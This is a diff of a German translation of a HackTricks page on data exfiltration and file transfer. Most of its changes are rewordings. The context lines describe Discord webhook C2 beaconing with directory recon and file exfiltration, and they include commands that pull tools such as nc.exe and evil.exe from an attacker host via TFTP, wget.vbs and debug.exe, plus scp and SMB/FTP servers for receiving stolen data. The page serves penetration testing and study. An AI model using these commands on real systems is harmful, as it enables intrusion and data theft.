@@ -2,9 +2,16 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Häufig zugelassene Domains zur Exfiltration von Informationen
+> [!TIP]
+> Für ein End-to-End-Beispiel, wie Loot in `C:\Users\Public` staged und anschließend mit Rclone exfiltriert wird, um legitime Backups zu imitieren, siehe den untenstehenden Workflow.
 
-Siehe [https://lots-project.com/](https://lots-project.com/), um häufig zugelassene Domains zu finden, die missbraucht werden können
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
+## Häufig whitelisted domains to exfiltrate information
+
+Sieh dir [https://lots-project.com/](https://lots-project.com/) an, um häufig whitelisted Domains zu finden, die missbraucht werden können
 
 ## Kopieren\&Einfügen Base64
 
@@ -102,12 +109,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## Webhooks (Discord/Slack/Teams) für C2 & Data Exfiltration
 
-Webhooks sind nur zum Schreiben bestimmte HTTPS-Endpunkte, die JSON und optionale file parts akzeptieren. Sie werden häufig für vertrauenswürdige SaaS-Domains zugelassen und erfordern keine OAuth/API keys, wodurch sie sich für low-friction beaconing und exfiltration eignen.
+Webhooks sind nur beschreibbare HTTPS-Endpunkte, die JSON und optionale Datei-Parts akzeptieren. Sie werden häufig für vertrauenswürdige SaaS-Domains zugelassen und benötigen keine OAuth/API keys, wodurch sie sich für low-friction beaconing und exfiltration eignen.
 
 Key ideas:
 - Endpunkt: Discord verwendet https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data mit einem Part namens payload_json, der {"content":"..."} enthält, und optionalen file part(s) namens file.
-- Operator-Loop-Muster: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK bestätigen die Zustellung.
+- POST multipart/form-data mit einem Part namens payload_json, der {"content":"..."} enthält, und optionalen Datei-Part(s) namens file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK bestätigen die Zustellung.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,8 +185,8 @@ Start-Sleep -Seconds 20
 }
 ```
 Hinweise:
-- Ähnliche Muster gelten für andere Kollaborationsplattformen (Slack/Teams), die ihre incoming webhooks verwenden; passe die URL und das JSON-Schema entsprechend an.
-- Für DFIR von Discord Desktop Cache-Artefakten und webhook/API-Wiederherstellung, siehe:
+- Ähnliche Muster gelten für andere Kollaborationsplattformen (Slack/Teams), die ihre incoming webhooks verwenden; passe URL und JSON schema entsprechend an.
+- Für DFIR von Discord Desktop cache artifacts und webhook/API recovery, siehe:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -187,7 +194,7 @@ Hinweise:
 
 ## FTP
 
-### FTP-Server (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -235,7 +242,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Oder erstelle ein smb share **mit samba**:
+Oder erstelle ein smb share **using samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -266,7 +273,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Wenn die victim SSH hat, kann der attacker ein Verzeichnis vom victim auf den attacker mounten.
+Wenn die victim SSH hat, kann der attacker ein Verzeichnis von der victim auf den attacker mounten.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -313,15 +320,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Wenn du Daten an einen SMTP-Server senden kannst, kannst du mit python einen SMTP-Server erstellen, um die Daten zu empfangen:
+Wenn Sie Daten an einen SMTP-Server senden können, können Sie mit python einen SMTP-Server erstellen, um die Daten zu empfangen:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Standardmäßig in XP und 2003 (bei anderen muss es während der Installation explizit hinzugefügt werden)
+Standardmäßig in XP und 2003 (in anderen muss es während der Installation explizit hinzugefügt werden)
 
-Unter Kali: **start TFTP server**:
+Unter Kali, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -333,7 +340,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Auf **victim** eine Verbindung zum Kali-Server herstellen:
+Auf **victim**, verbinde dich mit dem Kali-Server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Das `debug.exe`-Programm erlaubt nicht nur die Inspektion von binaries, sondern besitzt auch die **Fähigkeit, diese aus hex zu rekonstruieren**. Das bedeutet, dass `debug.exe` durch das Bereitstellen eines hex eines binary die binary-Datei erzeugen kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung beim assembling von files bis zu 64 kb Größe** hat.
+Das Programm `debug.exe` erlaubt nicht nur die Inspektion von binaries, sondern hat auch die **Fähigkeit, sie aus hex zu rekonstruieren**. Das heißt, durch die Angabe eines hex einer binary kann `debug.exe` die binary file erzeugen. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung beim Assemblieren von Dateien auf eine Größe von bis zu 64 kb** hat.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kopiere dann den Text in die Windows-Shell und es wird eine Datei namens nc.exe erstellt.
+Kopiere den Text in die Windows-Shell und füge ihn dort ein; es wird eine Datei namens nc.exe erstellt.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -395,7 +402,7 @@ Kopiere dann den Text in die Windows-Shell und es wird eine Datei namens nc.exe 
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
-## Referenzen
+## Quellen
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
